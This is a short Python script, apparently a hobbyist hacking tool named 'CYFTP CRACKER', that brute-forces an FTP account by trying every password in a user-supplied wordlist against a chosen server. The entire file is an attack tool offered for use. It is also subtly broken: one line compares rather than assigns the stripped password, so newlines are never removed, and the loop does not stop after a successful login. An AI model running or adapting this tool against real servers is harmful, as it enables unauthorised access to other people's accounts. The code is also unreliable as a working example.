#!/usr/bin/python3
import ftplib
print("WELCOME TO CYFTP CRACKER")
print("CYBERNETIC__OFFICIAL")
server=input("FTP server:")
user=input("username:")
passwordlist=input("path to password list>")
try:
    with open(passwordlist,"r")as pw:
        for word in pw:
            word==word.strip("\r").strip("\n")
            try:
                ftp=ftplib.FTP(server)
                ftp.login(user,word)
                print("sucess!the password is ",word)
            except:
                print("still trying!")
except:
    print("wordlist errror")